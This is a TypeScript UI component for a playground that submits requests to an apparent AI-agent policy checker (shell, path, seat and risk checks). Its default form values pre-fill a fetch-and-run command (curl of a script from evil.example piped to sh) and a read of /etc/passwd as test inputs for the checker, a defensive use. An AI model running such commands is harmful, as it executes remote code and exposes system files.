import type { MethodName } from "@lib/capnp-codec";
import { PATH_ACTIONS, RISK_ACTIONS, SEAT_ACTIONS } from "@lib/capnp-codec";
import { type FixtureCatalogEntry, listFixtures } from "@lib/fixtures";

export interface MethodFormState {
  method: MethodName | string;
  agentHi: number;
  agentLo: number;
  cwd: string;
  /** One argv token per line */
  argvText: string;
  path: string;
  action: string;
  model: string;
  fixtureId: string;
}

export const DEFAULT_FORM: MethodFormState = {
  method: "checkShell",
  agentHi: 1,
  agentLo: 2,
  cwd: "/ws",
  argvText: "curl\nhttps://evil.example/x.sh\nsh",
  path: "/etc/passwd",
  action: "read",
  model: "",
  fixtureId: "",
};

const METHODS: { id: MethodName | string; label: string; stub?: boolean }[] = [
  { id: "checkShell", label: "checkShell" },
  { id: "checkPath", label: "checkPath" },
  { id: "checkSeat", label: "checkSeat" },
  { id: "checkRisk", label: "checkRisk" },
  { id: "checkModel", label: "checkModel", stub: true },
  { id: "admitModel", label: "admitModel", stub: true },
];

function actionOptions(method: string): { value: string; label: string }[] {
  if (method === "checkPath") {
    return Object.keys(PATH_ACTIONS).map((k) => ({ value: k, label: k }));
  }
  if (method === "checkSeat") {
    return Object.keys(SEAT_ACTIONS).map((k) => ({ value: k, label: k }));
  }
  if (method === "checkRisk") {
    return Object.keys(RISK_ACTIONS).map((k) => ({ value: k, label: k }));
  }
  return [];
}

/** First valid action key for the method's action map (path/seat/risk). */
export function defaultActionForMethod(method: string): string {
  const opts = actionOptions(method);
  if (opts.length > 0) return opts[0]!.value;
  // checkShell and stubs have no action field; keep a harmless default
  return "read";
}

export function formToArgv(form: MethodFormState): string[] {
  return form.argvText
    .split("\n")
    .map((s) => s.replace(/\r$/, ""))
    .filter((s) => s.length > 0);
}

interface Props {
  form: MethodFormState;
  onChange: (next: MethodFormState) => void;
  onRun: () => void;
  onLoadFixture: (id: string) => void;
  disabled?: boolean;
  running?: boolean;
}

export function MethodForm({
  form,
  onChange,
  onRun,
  onLoadFixture,
  disabled,
  running,
}: Props) {
  const fixtures: FixtureCatalogEntry[] = listFixtures().filter((f) => {
    if (form.method === "checkShell") return f.method === "checkShell";
    if (form.method === "checkPath") return f.method === "checkPath";
    if (form.method === "checkSeat") return f.method === "checkSeat";
    if (form.method === "checkRisk") return f.method === "checkRisk";
    return true;
  });
  const actions = actionOptions(form.method);
  const isStub = form.method === "checkModel" || form.method === "admitModel";
  const isShell = form.method === "checkShell";
  const needsPath = form.method === "checkPath" || form.method === "checkRisk";
  const needsAction =
    form.method === "checkPath" ||
    form.method === "checkSeat" ||
    form.method === "checkRisk";

  return (
    <div class="pane method-form">
      <header class="pane-header">
        <h2>Request</h2>
      </header>

      <label class="field">
        <span>Method</span>
        <select
          value={form.method}
          disabled={disabled}
          onChange={(e) => {
            const method = (e.target as HTMLSelectElement).value;
            onChange({
              ...form,
              method,
              fixtureId: "",
              // Reset action to the first valid key for this method's map
              // (path→read, seat→publishRun, risk→network). Avoids stale
              // "read" when switching to seat/risk.
              action: defaultActionForMethod(method),
            });
          }}
        >
          {METHODS.map((m) => (
            <option value={m.id} key={m.id}>
              {m.label}
              {m.stub ? " (stub)" : ""}
            </option>
          ))}
        </select>
      </label>

      <label class="field">
        <span>Fixture</span>
        <select
          value={form.fixtureId}
          disabled={disabled || fixtures.length === 0}
          onChange={(e) => {
            const id = (e.target as HTMLSelectElement).value;
            onChange({ ...form, fixtureId: id });
            if (id) onLoadFixture(id);
          }}
        >
          <option value="">— custom —</option>
          {fixtures.map((f) => (
            <option value={f.id} key={f.id}>
              {f.id}
            </option>
          ))}
        </select>
      </label>

      <div class="field-row">
        <label class="field">
          <span>agentId.hi</span>
          <input
            type="number"
            min={0}
            value={form.agentHi}
            disabled={disabled}
            onInput={(e) =>
              onChange({
                ...form,
                agentHi: Number((e.target as HTMLInputElement).value) || 0,
              })
            }
          />
        </label>
        <label class="field">
          <span>agentId.lo</span>
          <input
            type="number"
            min={0}
            value={form.agentLo}
            disabled={disabled}
            onInput={(e) =>
              onChange({
                ...form,
                agentLo: Number((e.target as HTMLInputElement).value) || 0,
              })
            }
          />
        </label>
      </div>

      {isShell && (
        <>
          <label class="field">
            <span>cwd</span>
            <input
              type="text"
              value={form.cwd}
              disabled={disabled}
              onInput={(e) =>
                onChange({
                  ...form,
                  cwd: (e.target as HTMLInputElement).value,
                })
              }
            />
          </label>
          <label class="field">
            <span>argv (one token per line)</span>
            <textarea
              rows={8}
              value={form.argvText}
              disabled={disabled}
              spellcheck={false}
              onInput={(e) =>
                onChange({
                  ...form,
                  argvText: (e.target as HTMLTextAreaElement).value,
                })
              }
            />
          </label>
        </>
      )}

      {needsAction && (
        <label class="field">
          <span>action</span>
          <select
            value={form.action}
            disabled={disabled}
            onChange={(e) =>
              onChange({
                ...form,
                action: (e.target as HTMLSelectElement).value,
              })
            }
          >
            {actions.map((a) => (
              <option value={a.value} key={a.value}>
                {a.label}
              </option>
            ))}
          </select>
        </label>
      )}

      {needsPath && (
        <label class="field">
          <span>path</span>
          <input
            type="text"
            value={form.path}
            disabled={disabled}
            onInput={(e) =>
              onChange({
                ...form,
                path: (e.target as HTMLInputElement).value,
              })
            }
          />
        </label>
      )}

      {isStub && (
        <label class="field">
          <span>model (stub)</span>
          <input
            type="text"
            value={form.model}
            disabled={disabled}
            placeholder="not wired to WASM yet"
            onInput={(e) =>
              onChange({
                ...form,
                model: (e.target as HTMLInputElement).value,
              })
            }
          />
        </label>
      )}

      {isStub && (
        <p class="hint warn">
          {form.method} is a form stub only — no Cap&apos;n encode / WASM export in this
          playground yet.
        </p>
      )}

      <button
        type="button"
        class="btn primary"
        disabled={disabled || running || isStub}
        onClick={onRun}
      >
        {running ? "Evaluating…" : "Evaluate"}
      </button>
    </div>
  );
}
